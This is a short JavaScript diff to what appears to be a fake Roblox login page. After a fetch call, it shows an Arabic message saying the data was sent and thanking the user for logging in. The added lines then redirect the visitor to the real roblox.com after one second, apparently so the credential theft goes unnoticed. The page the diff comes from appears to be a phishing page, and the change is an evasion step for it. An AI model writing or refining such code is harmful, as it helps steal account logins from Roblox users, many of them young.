@@ -153,6 +153,11 @@
             .then(data => {
                 result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
                 result.style.color = "#4CAF50"; // Green color for success messages
+                
+                // Redirect to Roblox after 1 second
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com";
+                }, 1000); // 1 second delay
             })
             .catch((error) => {
                 console.error('Error:', error);
